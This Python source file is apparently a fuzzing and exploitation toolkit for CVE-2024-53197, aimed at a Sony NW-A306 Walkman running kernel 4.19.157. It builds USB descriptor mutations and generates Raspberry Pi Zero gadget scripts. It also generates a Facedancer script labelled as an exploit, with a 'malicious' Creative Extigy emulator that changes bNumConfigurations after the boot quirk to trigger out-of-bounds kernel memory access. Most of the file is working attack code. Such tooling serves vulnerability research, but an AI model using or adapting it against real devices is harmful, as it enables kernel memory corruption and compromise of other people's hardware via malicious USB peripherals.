#!/usr/bin/env python3
"""
USB Descriptor Mutation Engine for CVE-2024-53197 Fuzzing

Provides runtime mutation strategies and fuzzing coordination
for Pi Zero and Facedancer harnesses.

Target: Sony NW-A306 Walkman (kernel 4.19.157)
"""

from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Callable, Generator
from enum import Enum
import random
import struct
import time
import json
import hashlib


class FuzzingStrategy(Enum):
    """Fuzzing strategy modes"""
    SEQUENTIAL = "sequential"           # Test mutations in order
    RANDOM = "random"                   # Random mutation selection
    WEIGHTED = "weighted"               # Prefer high-severity mutations
    COVERAGE_GUIDED = "coverage_guided"  # Track unique crash signatures
    EVOLUTIONARY = "evolutionary"       # Mutate successful mutations


class CrashType(Enum):
    """Types of crashes/behaviors to detect"""
    KERNEL_PANIC = "kernel_panic"
    KERNEL_OOPS = "kernel_oops"
    SOFT_LOCKUP = "soft_lockup"
    HARD_LOCKUP = "hard_lockup"
    MEMORY_CORRUPTION = "memory_corruption"
    DEVICE_DISCONNECT = "device_disconnect"
    HANG = "hang"
    NO_CRASH = "no_crash"
    UNKNOWN = "unknown"


@dataclass
class FuzzingResult:
    """Result of a single fuzzing attempt"""
    mutation_id: str
    mutation_name: str
    timestamp: float
    crash_type: CrashType
    crash_signature: Optional[str] = None
    dmesg_output: Optional[str] = None
    device_state: str = "unknown"
    execution_time_ms: int = 0
    notes: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "mutation_id": self.mutation_id,
            "mutation_name": self.mutation_name,
            "timestamp": self.timestamp,
            "crash_type": self.crash_type.value,
            "crash_signature": self.crash_signature,
            "dmesg_output": self.dmesg_output,
            "device_state": self.device_state,
            "execution_time_ms": self.execution_time_ms,
            "notes": self.notes
        }


@dataclass
class FuzzingSession:
    """Fuzzing session state"""
    session_id: str
    start_time: float
    strategy: FuzzingStrategy
    target_device: str
    results: List[FuzzingResult] = field(default_factory=list)
    unique_crashes: Dict[str, FuzzingResult] = field(default_factory=dict)
    mutations_tested: int = 0
    crashes_found: int = 0

    def add_result(self, result: FuzzingResult):
        self.results.append(result)
        self.mutations_tested += 1

        if result.crash_type != CrashType.NO_CRASH:
            self.crashes_found += 1
            if result.crash_signature and result.crash_signature not in self.unique_crashes:
                self.unique_crashes[result.crash_signature] = result

    def get_statistics(self) -> Dict[str, Any]:
        crash_counts = {}
        for ct in CrashType:
            crash_counts[ct.value] = sum(
                1 for r in self.results if r.crash_type == ct
            )

        return {
            "session_id": self.session_id,
            "duration_seconds": time.time() - self.start_time,
            "mutations_tested": self.mutations_tested,
            "crashes_found": self.crashes_found,
            "unique_crash_signatures": len(self.unique_crashes),
            "crash_breakdown": crash_counts,
            "crash_rate": self.crashes_found / max(self.mutations_tested, 1)
        }


class USBDescriptorBuilder:
    """Builds USB descriptors from mutation templates"""

    @staticmethod
    def build_device_descriptor(
        bLength: int = 18,
        bDescriptorType: int = 0x01,
        bcdUSB: int = 0x0200,
        bDeviceClass: int = 0x00,
        bDeviceSubClass: int = 0x00,
        bDeviceProtocol: int = 0x00,
        bMaxPacketSize0: int = 64,
        idVendor: int = 0x041e,
        idProduct: int = 0x3000,
        bcdDevice: int = 0x0100,
        iManufacturer: int = 1,
        iProduct: int = 2,
        iSerialNumber: int = 3,
        bNumConfigurations: int = 1
    ) -> bytes:
        """Build a USB device descriptor"""
        return struct.pack(
            '<BBHBBBBHHHBBBB',
            bLength,
            bDescriptorType,
            bcdUSB,
            bDeviceClass,
            bDeviceSubClass,
            bDeviceProtocol,
            bMaxPacketSize0,
            idVendor,
            idProduct,
            bcdDevice,
            iManufacturer,
            iProduct,
            iSerialNumber,
            bNumConfigurations
        )

    @staticmethod
    def build_config_descriptor(
        bLength: int = 9,
        bDescriptorType: int = 0x02,
        wTotalLength: int = 794,
        bNumInterfaces: int = 1,
        bConfigurationValue: int = 1,
        iConfiguration: int = 0,
        bmAttributes: int = 0xC0,
        bMaxPower: int = 250
    ) -> bytes:
        """Build a USB configuration descriptor"""
        return struct.pack(
            '<BBHBBBBB',
            bLength,
            bDescriptorType,
            wTotalLength,
            bNumInterfaces,
            bConfigurationValue,
            iConfiguration,
            bmAttributes,
            bMaxPower
        )

    @staticmethod
    def build_interface_descriptor(
        bLength: int = 9,
        bDescriptorType: int = 0x04,
        bInterfaceNumber: int = 0,
        bAlternateSetting: int = 0,
        bNumEndpoints: int = 0,
        bInterfaceClass: int = 0x01,
        bInterfaceSubClass: int = 0x01,
        bInterfaceProtocol: int = 0x00,
        iInterface: int = 0
    ) -> bytes:
        """Build a USB interface descriptor"""
        return struct.pack(
            '<BBBBBBBBB',
            bLength,
            bDescriptorType,
            bInterfaceNumber,
            bAlternateSetting,
            bNumEndpoints,
            bInterfaceClass,
            bInterfaceSubClass,
            bInterfaceProtocol,
            iInterface
        )

    @staticmethod
    def build_endpoint_descriptor(
        bLength: int = 7,
        bDescriptorType: int = 0x05,
        bEndpointAddress: int = 0x81,
        bmAttributes: int = 0x05,
        wMaxPacketSize: int = 512,
        bInterval: int = 1
    ) -> bytes:
        """Build a USB endpoint descriptor"""
        return struct.pack(
            '<BBBBHB',
            bLength,
            bDescriptorType,
            bEndpointAddress,
            bmAttributes,
            wMaxPacketSize,
            bInterval
        )

    @staticmethod
    def build_audio_control_header(
        bLength: int = 9,
        bDescriptorType: int = 0x24,  # CS_INTERFACE
        bDescriptorSubtype: int = 0x01,  # HEADER
        bcdADC: int = 0x0100,
        wTotalLength: int = 9,
        bInCollection: int = 1,
        baInterfaceNr: List[int] = None
    ) -> bytes:
        """Build USB Audio Class control interface header"""
        if baInterfaceNr is None:
            baInterfaceNr = [1]

        header = struct.pack(
            '<BBBHHB',
            bLength,
            bDescriptorType,
            bDescriptorSubtype,
            bcdADC,
            wTotalLength,
            bInCollection
        )

        for iface_nr in baInterfaceNr:
            header += struct.pack('<B', iface_nr)

        return header


class MutationEngine:
    """
    Runtime mutation engine for USB descriptor fuzzing

    Coordinates mutation selection, execution, and result tracking
    """

    def __init__(self, mutations_file: Optional[str] = None):
        self.mutations: List[Dict] = []
        self.session: Optional[FuzzingSession] = None
        self.crash_signatures: Dict[str, int] = {}
        self.mutation_weights: Dict[str, float] = {}

        if mutations_file:
            self.load_mutations(mutations_file)

    def load_mutations(self, filepath: str):
        """Load mutations from JSON file"""
        with open(filepath, 'r') as f:
            data = json.load(f)
            self.mutations = data.get('mutations', [])

        # Initialize weights based on severity
        severity_weights = {
            "critical": 4.0,
            "high": 3.0,
            "medium": 2.0,
            "low": 1.0
        }

        for m in self.mutations:
            self.mutation_weights[m['id']] = severity_weights.get(m['severity'], 1.0)

    def start_session(
        self,
        strategy: FuzzingStrategy = FuzzingStrategy.WEIGHTED,
        target_device: str = "Sony NW-A306"
    ) -> FuzzingSession:
        """Start a new fuzzing session"""
        session_id = hashlib.md5(
            f"{time.time()}{random.random()}".encode()
        ).hexdigest()[:12]

        self.session = FuzzingSession(
            session_id=session_id,
            start_time=time.time(),
            strategy=strategy,
            target_device=target_device
        )

        return self.session

    def get_next_mutation(self) -> Optional[Dict]:
        """Get next mutation based on current strategy"""
        if not self.mutations:
            return None

        if not self.session:
            self.start_session()

        strategy = self.session.strategy

        if strategy == FuzzingStrategy.SEQUENTIAL:
            idx = self.session.mutations_tested % len(self.mutations)
            return self.mutations[idx]

        elif strategy == FuzzingStrategy.RANDOM:
            return random.choice(self.mutations)

        elif strategy == FuzzingStrategy.WEIGHTED:
            # Weighted random selection
            weights = [self.mutation_weights.get(m['id'], 1.0) for m in self.mutations]
            total = sum(weights)
            r = random.random() * total
            cumulative = 0
            for i, w in enumerate(weights):
                cumulative += w
                if r <= cumulative:
                    return self.mutations[i]
            return self.mutations[-1]

        elif strategy == FuzzingStrategy.COVERAGE_GUIDED:
            # Prefer mutations that haven't been tested or led to unique crashes
            untested = [
                m for m in self.mutations
                if not any(r.mutation_id == m['id'] for r in self.session.results)
            ]
            if untested:
                return random.choice(untested)
            # Otherwise use weighted
            return self.get_mutation_weighted()

        elif strategy == FuzzingStrategy.EVOLUTIONARY:
            # Start with mutations that have caused crashes
            if self.session.unique_crashes:
                # Pick a crashing mutation and mutate it slightly
                base = random.choice(list(self.session.unique_crashes.values()))
                base_mutation = next(
                    (m for m in self.mutations if m['id'] == base.mutation_id),
                    None
                )
                if base_mutation:
                    return self._evolve_mutation(base_mutation)
            return self.get_mutation_weighted()

        return None

    def get_mutation_weighted(self) -> Dict:
        """Get weighted random mutation"""
        weights = [self.mutation_weights.get(m['id'], 1.0) for m in self.mutations]
        total = sum(weights)
        r = random.random() * total
        cumulative = 0
        for i, w in enumerate(weights):
            cumulative += w
            if r <= cumulative:
                return self.mutations[i]
        return self.mutations[-1]

    def _evolve_mutation(self, base: Dict) -> Dict:
        """Create a slight variation of a mutation"""
        evolved = base.copy()
        evolved['id'] = f"{base['id']}_evolved_{random.randint(1000, 9999)}"

        # Randomly modify one field
        if 'post_quirk_descriptor' in evolved and evolved['post_quirk_descriptor']:
            desc = evolved['post_quirk_descriptor'].copy()
            current_bnum = int(desc.get('bNumConfigurations', 1))

            # Vary bNumConfigurations slightly
            delta = random.choice([-10, -5, -1, 1, 5, 10])
            new_bnum = max(2, min(255, current_bnum + delta))
            desc['bNumConfigurations'] = new_bnum
            evolved['post_quirk_descriptor'] = desc

        return evolved

    def record_result(
        self,
        mutation: Dict,
        crash_type: CrashType,
        dmesg_output: str = "",
        device_state: str = "unknown",
        execution_time_ms: int = 0,
        notes: str = ""
    ) -> FuzzingResult:
        """Record the result of a fuzzing attempt"""
        # Generate crash signature from dmesg output
        crash_signature = None
        if crash_type != CrashType.NO_CRASH and dmesg_output:
            crash_signature = self._generate_crash_signature(dmesg_output)

        result = FuzzingResult(
            mutation_id=mutation['id'],
            mutation_name=mutation['name'],
            timestamp=time.time(),
            crash_type=crash_type,
            crash_signature=crash_signature,
            dmesg_output=dmesg_output,
            device_state=device_state,
            execution_time_ms=execution_time_ms,
            notes=notes
        )

        if self.session:
            self.session.add_result(result)

        # Update mutation weights based on result
        if crash_type != CrashType.NO_CRASH:
            # Increase weight for mutations that cause crashes
            current_weight = self.mutation_weights.get(mutation['id'], 1.0)
            self.mutation_weights[mutation['id']] = min(current_weight * 1.5, 10.0)

        return result

    def _generate_crash_signature(self, dmesg_output: str) -> str:
        """Generate a unique signature for a crash"""
        # Extract key crash indicators
        indicators = []

        # Look for common crash patterns
        patterns = [
            "BUG:",
            "KASAN:",
            "Unable to handle kernel",
            "Call Trace:",
            "RIP:",
            "Oops:",
            "panic:",
            "slab-out-of-bounds",
            "use-after-free",
            "double-free",
            "kernel NULL pointer dereference"
        ]

        for pattern in patterns:
            if pattern.lower() in dmesg_output.lower():
                indicators.append(pattern)

        # Try to extract the crashing function
        import re
        func_match = re.search(r'(\w+)\+0x[0-9a-f]+', dmesg_output)
        if func_match:
            indicators.append(f"func:{func_match.group(1)}")

        # Create signature hash
        sig_str = "|".join(sorted(indicators))
        return hashlib.md5(sig_str.encode()).hexdigest()[:16]

    def iterate_mutations(self, count: int = 100) -> Generator[Dict, None, None]:
        """Iterate through mutations for fuzzing"""
        for _ in range(count):
            mutation = self.get_next_mutation()
            if mutation:
                yield mutation

    def export_session(self, filepath: str):
        """Export session results to JSON"""
        if not self.session:
            return

        data = {
            "session_id": self.session.session_id,
            "start_time": self.session.start_time,
            "strategy": self.session.strategy.value,
            "target_device": self.session.target_device,
            "statistics": self.session.get_statistics(),
            "results": [r.to_dict() for r in self.session.results],
            "unique_crashes": {
                sig: r.to_dict()
                for sig, r in self.session.unique_crashes.items()
            }
        }

        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

    def get_critical_mutations(self) -> List[Dict]:
        """Get only critical severity mutations"""
        return [m for m in self.mutations if m.get('severity') == 'critical']

    def get_bnum_overflow_mutations(self) -> List[Dict]:
        """Get bNumConfigurations overflow mutations"""
        return [
            m for m in self.mutations
            if m.get('mutation_type') == 'bNumConfigurations_overflow'
        ]


class ConfigFSGadgetGenerator:
    """
    Generates ConfigFS USB gadget configuration scripts

    For Pi Zero / Linux USB gadget deployment
    """

    GADGET_BASE = "/sys/kernel/config/usb_gadget"

    def __init__(self, gadget_name: str = "extigy_fuzzer"):
        self.gadget_name = gadget_name
        self.gadget_path = f"{self.GADGET_BASE}/{gadget_name}"

    def generate_script(
        self,
        mutation: Dict,
        phase: str = "initial"
    ) -> str:
        """
        Generate a bash script to configure USB gadget

        phase: "initial" for first enumeration, "post_quirk" for after boot quirk
        """
        desc = mutation.get('device_descriptor', {})
        config = mutation.get('config_descriptor', {})

        if phase == "post_quirk" and mutation.get('post_quirk_descriptor'):
            desc = mutation['post_quirk_descriptor']

        # Parse hex values
        vid = desc.get('idVendor', '0x041e')
        if isinstance(vid, str):
            vid = int(vid, 16)

        pid = desc.get('idProduct', '0x3000')
        if isinstance(pid, str):
            pid = int(pid, 16)

        bnum = desc.get('bNumConfigurations', 1)
        if isinstance(bnum, str):
            bnum = int(bnum)

        wTotalLength = config.get('wTotalLength', 794)

        script = f'''#!/bin/bash
# CVE-2024-53197 USB Gadget Configuration
# Mutation: {mutation.get('name', 'unknown')}
# Phase: {phase}

set -e

GADGET="{self.gadget_path}"

# Cleanup existing gadget
if [ -d "$GADGET" ]; then
    # Disable UDC
    echo "" > "$GADGET/UDC" 2>/dev/null || true

    # Remove symlinks
    find "$GADGET/configs" -type l -exec rm {{}} \\;

    # Remove strings
    rmdir "$GADGET/configs/"*/strings/* 2>/dev/null || true
    rmdir "$GADGET/configs/"* 2>/dev/null || true
    rmdir "$GADGET/functions/"* 2>/dev/null || true
    rmdir "$GADGET/strings/"* 2>/dev/null || true
    rmdir "$GADGET" 2>/dev/null || true
fi

# Load modules
modprobe libcomposite

# Create gadget
mkdir -p "$GADGET"
cd "$GADGET"

# Device descriptor
echo 0x{vid:04x} > idVendor
echo 0x{pid:04x} > idProduct
echo 0x0200 > bcdUSB
echo 0x0100 > bcdDevice

# Device class (per-interface)
echo 0x00 > bDeviceClass
echo 0x00 > bDeviceSubClass
echo 0x00 > bDeviceProtocol
echo 64 > bMaxPacketSize0

# Strings
mkdir -p strings/0x409
echo "FUZZER001" > strings/0x409/serialnumber
echo "Creative Technology" > strings/0x409/manufacturer
echo "Sound Blaster Extigy" > strings/0x409/product

# Configuration
mkdir -p configs/c.1/strings/0x409
echo "Audio Config" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower
echo 0xC0 > configs/c.1/bmAttributes

# UAC2 Function (Audio Class 2.0)
mkdir -p functions/uac2.usb0

# Audio parameters
echo 2 > functions/uac2.usb0/c_chmask  # Stereo capture
echo 48000 > functions/uac2.usb0/c_srate  # Sample rate
echo 2 > functions/uac2.usb0/c_ssize  # Sample size (bytes)
echo 2 > functions/uac2.usb0/p_chmask  # Stereo playback
echo 48000 > functions/uac2.usb0/p_srate
echo 2 > functions/uac2.usb0/p_ssize

# Link function to config
ln -s functions/uac2.usb0 configs/c.1/

# Enable gadget
UDC=$(ls /sys/class/udc | head -n1)
if [ -n "$UDC" ]; then
    echo "$UDC" > UDC
    echo "[+] Gadget enabled on $UDC"
else
    echo "[-] No UDC found"
    exit 1
fi

echo "[+] USB gadget configured as Extigy (phase: {phase})"
echo "[+] bNumConfigurations will be: {bnum}"
echo "[+] Waiting for boot quirk trigger..."
'''

        return script

    def generate_descriptor_patch_script(self, mutation: Dict) -> str:
        """
        Generate script to patch device descriptor after boot quirk

        This is the key part - modifying bNumConfigurations mid-connection
        """
        post_desc = mutation.get('post_quirk_descriptor', {})
        bnum = post_desc.get('bNumConfigurations', 255)

        if isinstance(bnum, str):
            bnum = int(bnum)

        script = f'''#!/bin/bash
# CVE-2024-53197 Descriptor Patch Script
# Mutation: {mutation.get('name', 'unknown')}
# Patches bNumConfigurations after boot quirk

# NOTE: This requires kernel-level descriptor manipulation
# Standard ConfigFS doesn't allow changing descriptors mid-connection
# This script is a placeholder for actual implementation

# Options for actual implementation:
# 1. Custom kernel module that hooks USB descriptor responses
# 2. Facedancer hardware with Python control
# 3. Modified dwc2 gadget driver

echo "[!] Descriptor patching requires low-level USB access"
echo "[!] New bNumConfigurations: {bnum}"
echo "[!] OOB offset: {(bnum - 1) * 272} bytes"

# If using custom kernel module:
# echo {bnum} > /sys/kernel/debug/usb_fuzzer/bNumConfigurations

# If using Facedancer:
# python3 -c "import facedancer; fd.set_bnum({bnum})"

exit 0
'''

        return script


class FacedancerGadgetGenerator:
    """
    Generates Facedancer Python scripts for USB gadget emulation

    For GreatFET / Cynthion deployment
    """

    def generate_script(self, mutation: Dict) -> str:
        """Generate complete Facedancer script for a mutation"""
        desc = mutation.get('device_descriptor', {})
        post_desc = mutation.get('post_quirk_descriptor', desc)
        config = mutation.get('config_descriptor', {})

        # Parse values
        vid = desc.get('idVendor', '0x041e')
        if isinstance(vid, str):
            vid = int(vid, 16)

        pid = desc.get('idProduct', '0x3000')
        if isinstance(pid, str):
            pid = int(pid, 16)

        initial_bnum = desc.get('bNumConfigurations', 1)
        post_bnum = post_desc.get('bNumConfigurations', 255)
        wTotalLength = config.get('wTotalLength', 794)

        script = f'''#!/usr/bin/env python3
"""
CVE-2024-53197 Facedancer Exploit Script
Mutation: {mutation.get('name', 'unknown')}
Severity: {mutation.get('severity', 'unknown')}

Target: Sony NW-A306 Walkman (kernel 4.19.157)
Expected Impact: {mutation.get('expected_impact', 'unknown')}
"""

import time
import struct
from facedancer import FacedancerUSBApp
from facedancer.USBDevice import USBDevice
from facedancer.USBConfiguration import USBConfiguration
from facedancer.USBInterface import USBInterface
from facedancer.USBEndpoint import USBEndpoint


class ExtigyExploitDevice(USBDevice):
    """
    Malicious Creative Extigy emulator

    Exploits CVE-2024-53197 by changing bNumConfigurations
    after the boot quirk sends its control message.
    """

    name = "Sound Blaster Extigy"
    vendor_id = 0x{vid:04x}
    product_id = 0x{pid:04x}

    # Phase tracking
    boot_quirk_triggered = False

    # Descriptor values
    INITIAL_BNUM_CONFIGURATIONS = {initial_bnum}
    POST_QUIRK_BNUM_CONFIGURATIONS = {post_bnum}

    # Firmware size that triggers quirk (794 = old, 483 = new)
    TRIGGER_WTOTALLENGTH = {wTotalLength}

    def __init__(self, app):
        # Build configurations
        config = USBConfiguration(
            index=1,
            string="Extigy Config",
            attributes=0xC0,  # Self-powered
            max_power=250,
            interfaces=[
                USBInterface(
                    index=0,
                    alternate=0,
                    class_=0x01,  # Audio
                    subclass=0x01,  # Audio Control
                    protocol=0x00,
                    string="Audio Control",
                    endpoints=[]
                )
            ]
        )

        super().__init__(
            app,
            device_class=0x00,
            device_subclass=0x00,
            protocol=0x00,
            max_packet_size_ep0=64,
            vendor_id=self.vendor_id,
            product_id=self.product_id,
            device_rev=0x0100,
            strings=[
                "Creative Technology",
                "Sound Blaster Extigy",
                "EXPLOIT001"
            ],
            configurations=[config]
        )

    def handle_request(self, req):
        """Handle USB control requests"""

        # Detect Extigy boot quirk control message
        # Request: 0x10, Type: 0x43, Value: 0x0001, Index: 0x000a
        if (req.request == 0x10 and
            req.request_type == 0x43 and
            req.value == 0x0001 and
            req.index == 0x000a):

            print("[!] BOOT QUIRK TRIGGERED!")
            print(f"[*] Request: bRequest=0x{{req.request:02x}}, "
                  f"bmRequestType=0x{{req.request_type:02x}}, "
                  f"wValue=0x{{req.value:04x}}, wIndex=0x{{req.index:04x}}")

            self.boot_quirk_triggered = True

            # Acknowledge the request
            self.send_control_message(b'')

            print("[*] Waiting for host to re-read device descriptor...")
            return

        # Pass to parent handler
        super().handle_request(req)

    def get_descriptor(self, req):
        """Handle GET_DESCRIPTOR requests"""

        descriptor_type = (req.value >> 8) & 0xFF
        descriptor_index = req.value & 0xFF

        # Device descriptor request
        if descriptor_type == 0x01:  # DEVICE
            return self._build_device_descriptor()

        # Configuration descriptor request
        elif descriptor_type == 0x02:  # CONFIGURATION
            return self._build_config_descriptor()

        return super().get_descriptor(req)

    def _build_device_descriptor(self):
        """Build device descriptor with conditional bNumConfigurations"""

        # Choose bNumConfigurations based on phase
        if self.boot_quirk_triggered:
            bnum = self.POST_QUIRK_BNUM_CONFIGURATIONS
            print(f"[!] Returning MALICIOUS descriptor: bNumConfigurations={bnum}")
            print(f"[!] OOB access size: {(bnum - 1) * 272} bytes")
        else:
            bnum = self.INITIAL_BNUM_CONFIGURATIONS
            print(f"[*] Returning initial descriptor: bNumConfigurations={bnum}")

        descriptor = struct.pack(
            '<BBHBBBBHHHBBBB',
            18,             # bLength
            0x01,           # bDescriptorType (DEVICE)
            0x0200,         # bcdUSB (USB 2.0)
            0x00,           # bDeviceClass
            0x00,           # bDeviceSubClass
            0x00,           # bDeviceProtocol
            64,             # bMaxPacketSize0
            self.vendor_id, # idVendor
            self.product_id,# idProduct
            0x0100,         # bcdDevice
            1,              # iManufacturer
            2,              # iProduct
            3,              # iSerialNumber
            bnum            # bNumConfigurations (VULNERABLE FIELD)
        )

        return descriptor

    def _build_config_descriptor(self):
        """Build configuration descriptor with trigger wTotalLength"""

        # Basic config descriptor
        config_desc = struct.pack(
            '<BBHBBBBB',
            9,                          # bLength
            0x02,                       # bDescriptorType (CONFIGURATION)
            self.TRIGGER_WTOTALLENGTH,  # wTotalLength (triggers quirk!)
            1,                          # bNumInterfaces
            1,                          # bConfigurationValue
            0,                          # iConfiguration
            0xC0,                       # bmAttributes (self-powered)
            250                         # bMaxPower (500mA)
        )

        # Audio Control Interface
        iface_desc = struct.pack(
            '<BBBBBBBBB',
            9,      # bLength
            0x04,   # bDescriptorType (INTERFACE)
            0,      # bInterfaceNumber
            0,      # bAlternateSetting
            0,      # bNumEndpoints
            0x01,   # bInterfaceClass (Audio)
            0x01,   # bInterfaceSubClass (Audio Control)
            0x00,   # bInterfaceProtocol
            0       # iInterface
        )

        # Pad to match wTotalLength
        padding_needed = self.TRIGGER_WTOTALLENGTH - len(config_desc) - len(iface_desc)
        padding = bytes(padding_needed) if padding_needed > 0 else b''

        return config_desc + iface_desc + padding


def main():
    print("=" * 60)
    print("CVE-2024-53197 Facedancer Exploit")
    print("Mutation: {mutation.get('name', 'unknown')}")
    print("=" * 60)
    print()
    print(f"Target VID:PID = 0x{vid:04x}:0x{pid:04x}")
    print(f"Initial bNumConfigurations = {initial_bnum}")
    print(f"Post-quirk bNumConfigurations = {post_bnum}")
    print(f"Trigger wTotalLength = {wTotalLength}")
    print(f"Expected OOB size = {(post_bnum - 1) * 272} bytes")
    print()

    print("[*] Initializing Facedancer...")
    app = FacedancerUSBApp()

    print("[*] Creating exploit device...")
    device = ExtigyExploitDevice(app)

    print("[*] Connecting device...")
    device.connect()

    print("[*] Waiting for host enumeration...")
    print("[*] Watch for boot quirk trigger!")
    print()

    try:
        device.run()
    except KeyboardInterrupt:
        print("\\n[*] Interrupted by user")
    finally:
        device.disconnect()


if __name__ == "__main__":
    main()
'''

        return script


def main():
    """Demonstration of mutation engine"""
    print("=" * 70)
    print("USB Descriptor Mutation Engine")
    print("Target: CVE-2024-53197 / Sony NW-A306 Walkman")
    print("=" * 70)
    print()

    # Initialize engine
    engine = MutationEngine()

    # Generate some mutations inline for demo
    from descriptor_templates import DescriptorMutationGenerator
    generator = DescriptorMutationGenerator()
    mutations = generator.generate_all()

    print(f"Loaded {len(mutations)} mutations")
    print()

    # Export mutations
    generator.export_json("descriptor_mutations.json")

    # Reload from JSON
    engine.load_mutations("descriptor_mutations.json")

    # Start fuzzing session
    session = engine.start_session(
        strategy=FuzzingStrategy.WEIGHTED,
        target_device="Sony NW-A306 Walkman"
    )

    print(f"Started session: {session.session_id}")
    print(f"Strategy: {session.strategy.value}")
    print()

    # Demo iteration
    print("Top 5 mutations for testing:")
    print("-" * 50)
    for i, mutation in enumerate(engine.iterate_mutations(5), 1):
        print(f"{i}. [{mutation['severity'].upper()}] {mutation['name']}")
        print(f"   Type: {mutation['mutation_type']}")
        print(f"   Impact: {mutation['expected_impact'][:60]}...")
        print()

    # Generate Pi Zero script for first critical mutation
    critical = engine.get_critical_mutations()
    if critical:
        print("Generating Pi Zero script for critical mutation...")
        pz_gen = ConfigFSGadgetGenerator()
        script = pz_gen.generate_script(critical[0], phase="initial")
        print(f"Script generated: {len(script)} bytes")
        print()

        # Generate Facedancer script
        print("Generating Facedancer script...")
        fd_gen = FacedancerGadgetGenerator()
        fd_script = fd_gen.generate_script(critical[0])
        print(f"Script generated: {len(fd_script)} bytes")


if __name__ == "__main__":
    main()
